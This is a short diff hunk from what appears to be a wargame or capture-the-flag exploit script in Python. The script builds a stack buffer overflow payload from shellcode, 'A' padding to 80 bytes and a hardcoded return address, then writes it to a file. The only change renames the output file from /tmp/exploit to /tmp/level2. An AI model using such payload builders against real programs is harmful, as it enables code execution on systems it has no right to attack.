@@ -3,5 +3,5 @@ padding = "A" * (80 - len(shellcode))
 return_address = b"\x08\xa0\x04\x08"
 payload = shellcode + padding + return_address
 
-with open('/tmp/exploit', 'wb') as f:
+with open('/tmp/level2', 'wb') as f:
     f.write(payload)
